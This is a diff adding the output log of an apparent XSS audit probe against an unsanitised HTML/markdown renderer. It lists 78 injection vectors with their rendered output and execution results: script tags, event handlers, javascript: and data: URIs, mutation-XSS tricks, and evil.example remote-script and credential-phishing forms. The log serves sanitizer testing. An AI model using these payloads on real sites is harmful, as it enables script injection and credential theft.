@@ -1,0 +1,160 @@
+Error: Could not parse CSS stylesheet
+    at exports.createStylesheet (/workspace/web/node_modules/jsdom/lib/jsdom/living/helpers/stylesheets.js:37:21)
+    at HTMLStyleElementImpl._updateAStyleBlock (/workspace/web/node_modules/jsdom/lib/jsdom/living/nodes/HTMLStyleElement-impl.js:67:5)
+    at HTMLStyleElementImpl._attach (/workspace/web/node_modules/jsdom/lib/jsdom/living/nodes/HTMLStyleElement-impl.js:18:12)
+    at HTMLDivElementImpl._insert (/workspace/web/node_modules/jsdom/lib/jsdom/living/nodes/Node-impl.js:836:14)
+    at HTMLDivElementImpl._replaceAll (/workspace/web/node_modules/jsdom/lib/jsdom/living/nodes/Node-impl.js:1048:12)
+    at set innerHTML [as innerHTML] (/workspace/web/node_modules/jsdom/lib/jsdom/living/domparsing/InnerHTML-impl.js:28:19)
+    at set innerHTML [as innerHTML] (/workspace/web/node_modules/jsdom/lib/jsdom/living/generated/Element.js:1538:42)
+    at executes (file:///scion-volumes/scratchpad/projects/farmtable/salvage/r6-audit-195/probe.mjs:95:49)
+    at file:///scion-volumes/scratchpad/projects/farmtable/salvage/r6-audit-195/probe.mjs:148:35 <a id="
+ALLOWED  A1 iframe srcdoc  ARTIF=[tag:iframe,attr:srcdoc] EXEC=[]
+      out="<iframe srcdoc=\"&lt;script&gt;alert(1)&lt;/script&gt;\"></iframe>"
+ALLOWED  A3 object data js  ARTIF=[tag:object,scheme:javascript:alert(1)] EXEC=[]
+      out="<p><object data=\"javascript:alert(1)\"></object></p>\n"
+ALLOWED  A4 embed src js  ARTIF=[tag:embed,scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<embed src=\"javascript:alert(1)\">"
+ALLOWED  A5 base href hijack  ARTIF=[tag:base] EXEC=[]
+      out="<base href=\"https://evil.example/\">"
+ALLOWED  A6 meta refresh  ARTIF=[tag:meta,attr:http-equiv] EXEC=[]
+      out="<meta http-equiv=\"refresh\" content=\"0;url=https://evil.example\">"
+ALLOWED  A7 script tag  ARTIF=[tag:script,rawtext:<script] EXEC=[alert:1]
+      out="<script>alert(1)</script>"
+ALLOWED  A8 script src remote  ARTIF=[tag:script,rawtext:<script] EXEC=[]
+      out="<script src=\"https://evil.example/x.js\"></script>"
+ALLOWED  A9 link stylesheet  ARTIF=[tag:link] EXEC=[]
+      out="<link rel=stylesheet href=\"https://evil.example/x.css\">"
+ALLOWED  B1 img onerror  ARTIF=[event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<img src=x onerror=alert(1)>"
+ALLOWED  B2 body onload  ARTIF=[rawtext:on-handler] EXEC=[]
+      out="<body onload=alert(1)>"
+ALLOWED  B3 onfocus autofocus  ARTIF=[event:onfocus,rawtext:on-handler] EXEC=[alert:1]
+      out="<p tabindex=1 onfocus=alert(1)>x</p>"
+ALLOWED  B4 onpointerover  ARTIF=[event:onpointerover,rawtext:on-handler] EXEC=[alert:1]
+      out="<p onpointerover=alert(1)>x</p>"
+ALLOWED  B5 ontoggle details  ARTIF=[event:ontoggle,rawtext:on-handler] EXEC=[alert:1,alert:1]
+      out="<details ontoggle=alert(1) open>x</details>"
+ALLOWED  B6 onanimationstart  ARTIF=[event:onanimationstart,rawtext:on-handler] EXEC=[alert:1]
+      out="<p onanimationstart=alert(1)>x</p>"
+ALLOWED  B7 mixed-case OnErRoR  ARTIF=[event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<img src=x OnErRoR=alert(1)>"
+ALLOWED  B8 svg onload  ARTIF=[tag:svg,event:onload,rawtext:on-handler] EXEC=[alert:1,alert:1]
+      out="<p><svg onload=alert(1)></svg></p>\n"
+ALLOWED  B9 onbeforetoggle popover  ARTIF=[event:onbeforetoggle,rawtext:on-handler] EXEC=[alert:1]
+      out="<div popover onbeforetoggle=alert(1)>x</div>"
+ALLOWED  C1 md link javascript:  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"javascript:alert(1)\">x</a></p>\n"
+ALLOWED  C2 raw a javascript:  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"javascript:alert(1)\">x</a></p>\n"
+DENIED   C3 js tab obfuscation
+DENIED   C4 js newline obfuscation
+ALLOWED  C5 entity-encoded js  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"&#106;avascript:alert(1)\">x</a></p>\n"
+ALLOWED  C5b entity js hex  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"&#x6a;avascript&#58;alert(1)\">x</a></p>\n"
+ALLOWED  C5c entity js semicolonless  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"&#106avascript:alert(1)\">x</a></p>\n"
+ALLOWED  C6 data:text/html a  ARTIF=[scheme:data:text/html,<script>a,rawtext:<script] EXEC=[]
+      out="<p><a href=\"data:text/html,<script>alert(1)</script>\">x</a></p>\n"
+ALLOWED  C7 md image data uri  ARTIF=[scheme:data:text/html,%3Cscript] EXEC=[]
+      out="<p><img src=\"data:text/html,%3Cscript%3Ealert(1)%3C/script%3E\" alt=\"x\"></p>\n"
+ALLOWED  C8 vbscript:  ARTIF=[scheme:vbscript:msgbox(1)] EXEC=[]
+      out="<p><a href=\"vbscript:msgbox(1)\">x</a></p>\n"
+ALLOWED  C9 leading-space js  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\" javascript:alert(1)\">x</a></p>\n"
+DENIED   C10 NUL-in-scheme
+DENIED   C11 blob: href
+DENIED   C12 filesystem: href
+ALLOWED  C13 protocol-relative a  ARTIF=[protocol-relative:href] EXEC=[]
+      out="<p><a href=\"//evil.example/x\">x</a></p>\n"
+ALLOWED  C14 protocol-relative img  ARTIF=[protocol-relative:src] EXEC=[]
+      out="<p><img src=\"//evil.example/track.png\" alt=\"x\"></p>\n"
+DENIED   C15 protocol-relative bslash
+ALLOWED  C16 data: svg+xml img  ARTIF=[scheme:data:image/svg+xml,<svg,rawtext:on-handler] EXEC=[]
+      out="<img src=\"data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>\">"
+ALLOWED  C17 data: svg+xml base64  ARTIF=[scheme:data:image/svg+xml;base6] EXEC=[]
+      out="<img src=\"data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIG9ubG9hZD0iYWxlcnQoMSkiLz4=\">"
+DENIED   C18 unknown scheme evilproto
+ALLOWED  C19 uppercase JAVASCRIPT:  ARTIF=[scheme:JAVASCRIPT:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"JAVASCRIPT:alert(1)\">x</a></p>\n"
+ALLOWED  C20 js: in md autolink  ARTIF=[scheme:javascript:alert(1)] EXEC=[alert:1]
+      out="<p><a href=\"javascript:alert(1)\">javascript:alert(1)</a></p>\n"
+ALLOWED  D1 svg style  ARTIF=[tag:svg,tag:style] EXEC=[]
+      out="<p><svg><style>*{color:red}</style></svg></p>\n"
+ALLOWED  D2 svg script  ARTIF=[tag:svg,tag:script,rawtext:<script] EXEC=[alert:1]
+      out="<p><svg><script>alert(1)</script></svg></p>\n"
+ALLOWED  D3 svg animate href  ARTIF=[tag:svg,scheme:javascript:alert(1)] EXEC=[]
+      out="<p><svg><a><animate attributeName=\"href\" values=\"javascript:alert(1)\"/></a></svg></p>\n"
+ALLOWED  D4 svg set attributeName  ARTIF=[tag:svg] EXEC=[]
+      out="<p><svg><set attributeName=\"onload\" to=\"alert(1)\"/></svg></p>\n"
+ALLOWED  D5 svg foreignObject script  ARTIF=[tag:svg,tag:script,rawtext:<script] EXEC=[alert:1]
+      out="<p><svg><foreignObject><script>alert(1)</script></foreignObject></svg></p>\n"
+ALLOWED  D6 svg use external  ARTIF=[tag:svg] EXEC=[]
+      out="<p><svg><use href=\"https://evil.example/x.svg#a\"/></svg></p>\n"
+ALLOWED  D7 math annotation-xml  ARTIF=[tag:math,tag:script,rawtext:<script] EXEC=[alert:1]
+      out="<p><math><annotation-xml encoding=\"text/html\"><script>alert(1)</script></annotation-xml></math></p>\n"
+ALLOWED  D8 math mtext style  ARTIF=[tag:math,tag:style] EXEC=[]
+      out="<p><math><mtext><style>*{color:red}</style></mtext></math></p>\n"
+ALLOWED  D9 svg handler attr  ARTIF=[tag:svg,event:onbegin,rawtext:on-handler] EXEC=[]
+      out="<p><svg><circle onbegin=alert(1)/></svg></p>\n"
+ALLOWED  E1 style-in-svg mXSS  ARTIF=[tag:svg,tag:style,event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<p><svg></p><style><a id=\"</style><img src=1 onerror=alert(1)>\"></p>\n"
+ALLOWED  E2 noscript mXSS  ARTIF=[tag:noscript,rawtext:on-handler] EXEC=[alert:1]
+      out="<p><noscript><p title=\"</noscript><img src=x onerror=alert(1)>\"></p>\n"
+ALLOWED  E3 form nesting mXSS  ARTIF=[tag:form,tag:math,tag:style,rawtext:on-handler] EXEC=[]
+      out="<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>"
+ALLOWED  E4 template mXSS  ARTIF=[tag:template,rawtext:<script] EXEC=[]
+      out="<p><template><script>alert(1)</script></template></p>\n"
+ALLOWED  E5 textarea escape  ARTIF=[tag:textarea,event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<textarea></textarea><img src=x onerror=alert(1)>"
+ALLOWED  E6 nested svg/p mutation  ARTIF=[tag:svg,tag:style,rawtext:on-handler] EXEC=[]
+      out="<p><svg><p><style><img src=1 onerror=alert(1)></style></p></svg></p>\n"
+ALLOWED  E7 mglyph table mXSS  ARTIF=[tag:math,tag:style,rawtext:on-handler] EXEC=[]
+      out="<p><math><mtext><table><mglyph><style><!--</style><img title=\"--><img src=1 onerror=alert(1)>&quot;&gt;</p>\n"
+ALLOWED  E8 select mXSS  ARTIF=[tag:select,event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<p><select><noembed></select><img src=x onerror=alert(1)></p>\n"
+ALLOWED  E9 xmp escape  ARTIF=[event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<p><xmp></xmp><img src=x onerror=alert(1)></p>\n"
+ALLOWED  E10 svg desc mXSS  ARTIF=[tag:svg,event:onerror,rawtext:on-handler] EXEC=[alert:1]
+      out="<p><svg><desc><![CDATA[</desc><img src=1 onerror=alert(1)>]]></desc></svg></p>\n"
+ALLOWED  F1 form credential phish  ARTIF=[tag:form,attr:action,tag:input] EXEC=[]
+      out="<form action=\"https://evil.example\"><input type=password></form>"
+ALLOWED  F2 input password  ARTIF=[tag:input] EXEC=[]
+      out="<input type=password>"
+ALLOWED  F3 button formaction  ARTIF=[tag:button,attr:formaction] EXEC=[]
+      out="<p><button formaction=\"https://evil.example\">x</button></p>\n"
+ALLOWED  F4 dialog overlay  ARTIF=[tag:dialog] EXEC=[]
+      out="<dialog open>x</dialog>"
+ALLOWED  F5 style tag html ns  ARTIF=[tag:style] EXEC=[]
+      out="<style>*{color:red}</style>"
+ALLOWED  F6 style attr  ARTIF=[attr:style] EXEC=[]
+      out="<p style=\"position:fixed;inset:0\">x</p>"
+ALLOWED  F7 class forgery  ARTIF=[attr:class] EXEC=[]
+      out="<p class=\"comment-header\">x</p>"
+ALLOWED  F8 download rename  ARTIF=[attr:download] EXEC=[]
+      out="<p><a href=\"https://evil.example/x\" download=\"invoice.pdf\">x</a></p>\n"
+ALLOWED  F9 action attr  ARTIF=[attr:action] EXEC=[]
+      out="<div action=\"https://evil.example\">x</div>"
+ALLOWED  S1 slot bare  ARTIF=[attr:slot] EXEC=[]
+      out="<p slot=\"x\">y</p>"
+ALLOWED  S2 slot mixed case  ARTIF=[attr:slot] EXEC=[]
+      out="<p SLOT=\"footer\">y</p>"
+ALLOWED  S3 slot on div nested  ARTIF=[attr:slot] EXEC=[]
+      out="<div><span slot=\"summary\">forged</span></div>"
+ALLOWED  S4 slot inside template  ARTIF=[tag:template] EXEC=[]
+      out="<p><template><p slot=\"x\">y</p></template></p>\n"
+DENIED   S5 slot element itself
+ALLOWED  S6 slot in svg ns  ARTIF=[tag:svg,attr:slot] EXEC=[]
+      out="<p><svg><text slot=\"x\">y</text></svg></p>\n"
+ALLOWED  S7 slot entity-encoded name  ARTIF=[attr:slot] EXEC=[]
+      out="<p slot=\"&#115;ummary\">y</p>"
+ALLOWED  S8 slotchange handler  ARTIF=[event:onslotchange,rawtext:on-handler] EXEC=[alert:1]
+      out="<p><slot onslotchange=alert(1)></slot></p>\n"
+ALLOWED  T1 shadowroot declarative  ARTIF=[tag:template] EXEC=[]
+      out="<div><template shadowrootmode=\"open\"><style>*{display:none}</style></template></div>"
+ALLOWED  T2 shadowroot legacy attr  ARTIF=[tag:template] EXEC=[]
+      out="<div><template shadowroot=\"open\"><slot name=\"x\"></slot></template></div>"
+ALLOWED  T3 template with img onerror  ARTIF=[tag:template,rawtext:on-handler] EXEC=[]
+      out="<p><template><img src=x onerror=alert(1)></template></p>\n"
+
+PROBE-COMPLETE module=./mod-nosanitize.mjs vectors=78 allowed=70 denied=8 threw=0
